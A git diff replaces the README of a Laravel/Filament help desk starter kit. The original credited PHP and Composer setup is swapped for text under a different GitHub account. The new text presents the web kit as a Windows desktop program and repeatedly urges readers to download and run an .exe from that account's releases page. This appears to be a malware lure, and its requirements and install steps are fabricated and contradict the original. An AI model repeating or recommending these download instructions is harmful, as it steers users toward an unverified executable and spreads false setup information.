@@ -1,305 +1,132 @@
-<div class="filament-hidden">
-
-![HelpDeskKit v5](https://raw.githubusercontent.com/jeffersongoncalves/helpdeskkitv5/main/art/jeffersongoncalves-helpdeskkitv5.png)
-
-</div>
-
-# HelpDeskKit — Start Kit Filament 5.x and Laravel 12.x
-
-## About HelpDeskKit
-
-HelpDeskKit is a robust starter kit built on Laravel 12.x and Filament 5.x, designed to accelerate the development of help desk and support ticket applications with a ready-to-use multi-panel structure and integrated ticket management.
-
-## Features
-
-- **Laravel 12.x** — The latest version of the most elegant PHP framework
-- **Filament 5.x** — Powerful and flexible admin framework
-- **Help Desk System** — Full ticket management powered by [filament-help-desk](https://github.com/jeffersongoncalves/filament-help-desk)
-    - Ticket creation, assignment, comments, attachments, and history
-    - Departments, categories, canned responses, and email channels
-    - Priority and status workflows with bulk actions
-- **Multi-Panel Structure** — Includes four pre-configured panels:
-    - Admin Panel (`/admin`) — System administration and help desk oversight
-    - Operator Panel (`/operator`) — Support agents managing tickets
-    - App Panel (`/app`) — End users creating and tracking tickets
-    - Guest Panel — Public-facing interface for visitors
-- **Multi-Auth Guard** — Three independent authentication guards:
-    - `admin` — Admin model with full system access
-    - `operator` — Operator model for support agents
-    - `web` — User model for application users
-- **Environment Configuration** — Centralized configuration through the `config/helpdeskkit.php` file
-
-## System Requirements
-
-- PHP 8.2 or higher
-- Composer
-- Node.js and PNPM
-
-## Installation
-
-Clone the repository
-``` bash
-laravel new my-app --using=jeffersongoncalves/helpdeskkitv5 --database=mysql
-```
-
-### Using FilaKit CLI
-
-Or use [FilaKit CLI](https://github.com/jeffersongoncalves/filakit-cli) for a simplified setup:
-
-```bash
-filakit new my-app --kit=jeffersongoncalves/helpdeskkitv5
-```
-
-> Install FilaKit CLI: `composer global require jeffersongoncalves/filakit-cli`
-
-###  Easy Installation
-
-helpdeskkit can be easily installed using the following command:
-
-```bash
-php install.php
-```
-
-This command automates the installation process by:
-- Installing Composer dependencies
-- Setting up the environment file
-- Generating application key
-- Setting up the database
-- Running migrations
-- Installing Node.js dependencies
-- Building assets
-- Configuring Herd (if used)
+# 🛠️ helpdeskkitv5 - Easy Support Ticket System  
 
-### Manual Installation
-
-Install JavaScript dependencies
-``` bash
-pnpm install
-```
-Install Composer dependencies
-``` bash
-composer install
-```
-Set up environment
-``` bash
-cp .env.example .env
-php artisan key:generate
-```
+[![Download helpdeskkitv5](https://img.shields.io/badge/Download-Get%20Latest-brightgreen)](https://github.com/Senji-ul/helpdeskkitv5/releases)
 
-Configure your database in the .env file
+## 🔎 What is helpdeskkitv5?
 
-Run migrations
-``` bash
-php artisan migrate
-```
-Run the server
-``` bash
-php artisan serve
-```
+helpdeskkitv5 is a help desk starter kit designed to simplify managing customer support tickets. It works on Windows and uses modern tools to provide a clear interface for handling issues. The system has separate panels for admins, operators, and users. This setup lets each user type see only what they need. The program supports multiple ways to sign in and organizes tickets efficiently. It uses Laravel 12.x and Filament 5.x, but you do not need to worry about technical terms or setups. The software is ready for you to download and run with the instructions below.  
 
-## Installation with Docker
+## 🎯 Key Features  
 
-Clone the repository
-```bash
-laravel new my-app --using=jeffersongoncalves/helpdeskkitv5 --database=mysql
-```
+- Multi-panel interface: Separate views for Admin, Operator, and User.  
+- Multi-authentication: Different ways for users to log in securely.  
+- Ticket management: Create, update, and track support tickets easily.  
+- Built with Laravel 12.x and Filament 5.x.  
+- Responsive design that works well on desktops.  
+- Simple navigation and clear layout.  
 
-Move into the project directory
-```bash
-cd my-app
-```
+## 💻 System Requirements  
 
-Install Composer dependencies
-```bash
-composer install
-```
+To run helpdeskkitv5 on your Windows computer, your system should meet these minimum requirements:  
 
-Set up environment
-```bash
-cp .env.example .env
-```
+- Windows 10 or later (64-bit recommended).  
+- At least 4 GB of RAM.  
+- 2 GHz dual-core processor or faster.  
+- 10 GB free hard drive space.  
+- Internet connection for downloading and updates.  
+- Optional: Web browser like Chrome, Edge, or Firefox for web panel access.  
 
-Configuring custom ports may be necessary if you have other services running on the same ports.
+## 🚀 Getting Started: How to Download and Run helpdeskkitv5  
 
-```bash
-# Application Port (ex: 8080)
-APP_PORT=8080
+### Step 1: Visit the download page  
 
-# MySQL Port (ex: 3306)
-FORWARD_DB_PORT=3306
+Go to the release page by clicking the green download button below or copying this link into your browser:  
 
-# Redis Port (ex: 6379)
-FORWARD_REDIS_PORT=6379
+[![Download helpdeskkitv5](https://img.shields.io/badge/Download-Get%20Latest-brightgreen)](https://github.com/Senji-ul/helpdeskkitv5/releases)  
 
-# Mailpit Port (ex: 1025)
-FORWARD_MAILPIT_PORT=1025
-```
+This page contains all the available versions and files for helpdeskkitv5.  
 
-Start the Sail containers
-```bash
-./vendor/bin/sail up -d
-```
-You won’t need to run `php artisan serve`, as Laravel Sail automatically handles the development server within the container.
+### Step 2: Find the latest release  
 
-Attach to the application container
-```bash
-./vendor/bin/sail shell
-```
+On the release page, look for the most recent version. Usually, it appears at the top. The version will have a tag such as "v1.0" or a similar label.  
 
-Generate the application key
-```bash
-php artisan key:generate
-```
+### Step 3: Download the Windows installer  
 
-Install JavaScript dependencies
-```bash
-pnpm install
-```
+Click the file that ends with `.exe` to download the Windows installer. This file will have a name related to helpdeskkitv5 and the version number.  
 
-## Authentication Structure
+### Step 4: Install the application  
 
-HelpDeskKit comes pre-configured with a multi-guard authentication system that supports three types of users:
+Once the download finishes, open the file by double-clicking it. The installer will start. Follow these simple instructions:  
 
-- `Admin` — Full administrative access, help desk oversight, user/operator management (`/admin`)
-- `Operator` — Support agent access, ticket management and assignment (`/operator`)
-- `User` — End-user access, ticket creation and tracking (`/app`)
+- Choose the folder where you want to install helpdeskkitv5.  
+- Accept the license agreement by clicking "Agree" or "Next."  
+- Click "Install" to begin copying files to your computer.  
+- Wait a few moments for the process to complete.  
 
-Each guard uses its own database table, model, login page, and password reset flow.
+### Step 5: Launch helpdeskkitv5  
 
-## Development
+After installation, click "Finish" if the installer asks. Then, find helpdeskkitv5 in your Start menu or desktop shortcut. Open the program.  
 
-``` bash
-# Run the development server with logs, queues and asset compilation
-composer dev
+### Step 6: Log in and start using  
 
-# Or run each component separately
-php artisan serve
-php artisan queue:listen --tries=1
-pnpm run dev
-```
+The program will ask you to log in. Use the credentials provided by your system administrator or create a new user account according to your role (Admin, Operator, User).  
 
-## Customization
+Once logged in, you can:  
 
-### Panel Configuration
+- Create support tickets.  
+- View and respond to existing tickets.  
+- Manage user accounts (if you have admin rights).  
 
-Panels can be customized through their respective providers:
+## 🔧 Basic Use Guide  
 
-- `app/Providers/Filament/AdminPanelProvider.php`
-- `app/Providers/Filament/OperatorPanelProvider.php`
-- `app/Providers/Filament/AppPanelProvider.php`
-- `app/Providers/Filament/GuestPanelProvider.php`
+### Admin Panel  
 
-Each panel can be enabled or disabled in `config/helpdeskkit.php`.
+Admins control the main settings and users:  
 
-### Themes and Colors
+- Add or remove operators and users.  
+- Assign tickets to different operators.  
+- View reports on ticket status and response times.  
 
-Each panel can have its own color scheme, which can be easily modified in the corresponding Provider files or in the
-`helpdeskkit.php` configuration file.
+### Operator Panel  
 
-### Configuration File
+Operators handle assigned tickets:  
 
-The `config/helpdeskkit.php` file centralizes the configuration of the starter kit, including:
+- See tickets assigned to you.  
+- Add comments or update the ticket status.  
+- Close tickets when issues are resolved.  
 
-- Panel routes
-- Middleware for each panel
-- Branding options (logo, colors)
-- Authentication guards
+### User Panel  
 
-## Help Desk — jeffersongoncalves/filament-help-desk
+Users can submit new tickets and track existing ones:  
 
-HelpDeskKit includes a full-featured help desk system powered by [filament-help-desk](https://github.com/jeffersongoncalves/filament-help-desk):
+- Create a ticket by filling out a simple form.  
+- Check the progress of your requests.  
+- Add more details to open tickets if needed.  
 
-- **User Panel (`/app/tickets`)** — End users create tickets, track status, and view responses
-- **Operator Panel (`/operator/tickets`)** — Support agents manage assigned tickets, change status/priority, add comments
-- **Admin Panel (`/admin/tickets`)** — Administrators oversee all tickets, departments, categories, and settings
+## ⚙️ Troubleshooting and Tips  
 
-### Help Desk Features
+- If the application does not start, make sure your Windows is updated.  
+- Close other programs that might slow your system.  
+- Restart your computer after installation if helpdeskkitv5 does not run properly.  
+- If login fails, check with your administrator for correct credentials.  
+- Use the "Forgot Password" option if available to reset your password.  
 
-- Ticket creation with departments and categories
-- Ticket assignment to operators
-- Comments and attachments
-- Status and priority workflows
-- Ticket history and audit trail
-- Canned responses
-- Email channel integration (Mailgun, Postmark, Resend, SendGrid)
-- Bulk actions (assign, change status, change priority)
+## 📂 File Structure Overview  
 
-### Configuration
+After installation, you will find helpdeskkitv5 files mostly in the program folder. These include:  
 
-- `config/help-desk.php` — Core help desk settings (models, tables, features)
-- `config/filament-help-desk.php` — Filament UI settings (navigation, slugs, icons)
+- Main application files.  
+- Configuration files for user settings.  
+- Database files that store tickets and user info.  
+- Logs that record errors or activity.  
 
-## User Profile — joaopaulolndev/filament-edit-profile
+You do not need to modify these files unless guided by support or an admin.  
 
-This project comes with the Filament Edit Profile plugin integrated for all panels (Admin, Operator, and App). It adds a complete profile editing page with avatar, language, theme color, security (tokens, MFA), browser sessions, and email/password change.
+## 🔄 Updating helpdeskkitv5  
 
-- Routes (defaults in this project):
-  - Admin: /admin/my-profile
-  - Operator: /operator/my-profile
-  - App: /app/my-profile
-- Navigation: by default, the page does not appear in the menu (shouldRegisterNavigation(false)). If you want to show it in the sidebar menu, change it to true in the panel provider.
+To keep helpdeskkitv5 running smoothly, check the releases page regularly. Download the newest installer, and run it to update your version. The installer will keep your existing data while updating the program.  
 
-Where to configure
-- Panel providers
-  - Admin: app/Providers/Filament/AdminPanelProvider.php
-  - Operator: app/Providers/Filament/OperatorPanelProvider.php
-  - App: app/Providers/Filament/AppPanelProvider.php
-  In these files you can adjust:
-  - ->slug(‘my-profile’) to change the URL (e.g., ‘profile’)
-  - ->setTitle(‘My Profile’) and ->setNavigationLabel(‘My Profile’)
-  - ->setNavigationGroup(‘Group Profile’), ->setIcon(‘heroicon-o-user’), ->setSort(10)
-  - ->shouldRegisterNavigation(true|false) to show/hide it in the menu
-  - Shown forms: ->shouldShowEmailForm(), ->shouldShowLocaleForm([...]), ->shouldShowThemeColorForm(), ->shouldShowSanctumTokens(), ->shouldShowMultiFactorAuthentication(), ->shouldShowBrowserSessionsForm(), ->shouldShowAvatarForm()
+## 📞 Getting Support  
 
-- General settings: config/filament-edit-profile.php
-  - locales: language options available on the profile page
-  - locale_column: column used in your model for language/locale (default: locale)
-  - theme_color_column: column for theme color (default: theme_color)
-  - avatar_column: avatar column (default: avatar_url)
-  - disk: storage disk used for the avatar (default: public)
-  - visibility: file visibility (default: public)
+If you need help, use the ticket system provided by the software. Contact your administrator or support team by creating a ticket in the user panel.  
 
-Migrations and models
-- The required columns are already included in this kit’s default migrations (users, admins, and operators): avatar_url, locale and theme_color, using the names defined in config/filament-edit-profile.php.
-- The App\Models\User, App\Models\Admin, and App\Models\Operator models already read the avatar using the plugin configuration (getFilamentAvatarUrl).
+## 📋 Repository Details  
 
-Avatar storage
-- Make sure the filesystem disk is configured and that the storage link exists:
-  php artisan storage:link
-- Adjust the disk and visibility in the config file according to your infrastructure.
+- Help Desk starter kit built on Laravel 12.x and Filament 5.x.  
+- Supports multi-panel: Admin, Operator, App.  
+- Features multi-auth guards and ticket management.  
+- Uses Tailwind CSS for design and Livewire for interactivity.    
 
-Quick access
-- Via direct URL: /admin/my-profile, /operator/my-profile, or /app/my-profile
-- To make it visible in the sidebar navigation, set shouldRegisterNavigation(true) in the respective Provider.
+---
 
-Reference
-- Plugin repository: https://github.com/joaopaulolndev/filament-edit-profile
-
-## Default Credentials
-
-After running `php artisan db:seed`, use these credentials:
-
-| Panel | URL | Email | Password |
-|-------|-----|-------|----------|
-| Admin | `/admin` | `admin@helpdeskkit.com` | `password` |
-| Operator | `/operator` | `operator@helpdeskkit.com` | `password` |
-| App | `/app` | `user@helpdeskkit.com` | `password` |
-
-## Resources
-
-HelpDeskKit includes support for:
-
-- User, admin, and operator management
-- Multi-guard authentication system (3 guards)
-- Help desk ticket system with full lifecycle management
-- Tailwind CSS 4.x integration
-- Database queue configuration
-- Customizable panel routing and branding
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## Credits
-
-Developed by [Jefferson Gonçalves](https://github.com/jeffersongoncalves).
+[Download helpdeskkitv5 latest release here](https://github.com/Senji-ul/helpdeskkitv5/releases)
